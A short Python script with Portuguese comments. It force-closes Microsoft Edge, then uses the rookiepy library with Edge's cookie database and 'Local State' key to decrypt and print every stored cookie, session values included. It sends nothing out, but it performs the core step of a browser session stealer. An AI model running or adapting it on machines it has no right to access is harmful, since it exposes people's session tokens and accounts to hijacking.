import os
from pathlib import Path
import rookiepy
from datetime import datetime

def getCookies():
    try:
        # Verifica se o navegador Edge está aberto e fecha, se necessário
        if os.system("tasklist | findstr msedge.exe") == 0:
            os.system("taskkill /F /IM msedge.exe")
            os.system('cls' if os.name == 'nt' else 'clear')

        # Caminhos para os arquivos do Edge
        localappdata = os.getenv('LOCALAPPDATA')
        dbPath = Path(localappdata) / 'Microsoft/Edge/User Data/Default/Network/Cookies'
        keyPath = Path(localappdata) / 'Microsoft/Edge/User Data/Local State'

        # Usa rookiepy para extrair os cookies
        cookies = rookiepy.any_browser(db_path=str(dbPath), key_path=str(keyPath), domains=None)

        # Depuração: Exibir os cookies obtidos
        if cookies:
            print("\nCookies obtidos com sucesso:\n")
            for cookie in cookies:
                domain = cookie.get('domain', 'N/A')
                name = cookie.get('name', 'N/A')
                value = cookie.get('value', 'N/A')
                path = cookie.get('path', 'N/A')
                expires = cookie.get('expires', 'N/A')
                secure = cookie.get('secure', 'N/A')
                httpOnly = cookie.get('http_only', 'N/A')

                # Convertendo a data de expiração para um formato legível, se for um timestamp
                if expires != 'N/A' and isinstance(expires, int):
                    expires = datetime.utcfromtimestamp(expires).strftime('%Y-%m-%d %H:%M:%S')

                print(f"Dominio: {domain}")
                print(f"Nome: {name}")
                print(f"Valor: {value}")
                print(f"Caminho: {path}")
                print(f"Expira: {expires}")
                print(f"Seguro: {secure}")
                print(f"HTTP Only: {httpOnly}")
                print("-" * 40)
        else:
            print("Nenhum cookie foi encontrado ou descriptografado.")

        return cookies

    except Exception as e:
        print(f"Erro ao obter cookies: {e}")
        return None